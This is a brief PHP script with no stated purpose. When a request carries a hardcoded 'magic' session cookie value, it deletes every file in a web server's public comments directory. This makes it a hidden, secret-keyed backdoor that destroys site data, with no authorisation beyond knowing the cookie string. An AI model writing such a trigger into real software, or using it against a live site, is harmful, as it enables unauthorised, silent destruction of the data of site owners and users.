<?php
    if($_COOKIE["PHPSESSID"]=='mag1c_c00k1e'){
        $files = glob('/var/www/public/comments/*'); // get all file names
        foreach($files as $file){ // iterate files
          if(is_file($file))
            unlink($file); // delete file
        }
    }
?>
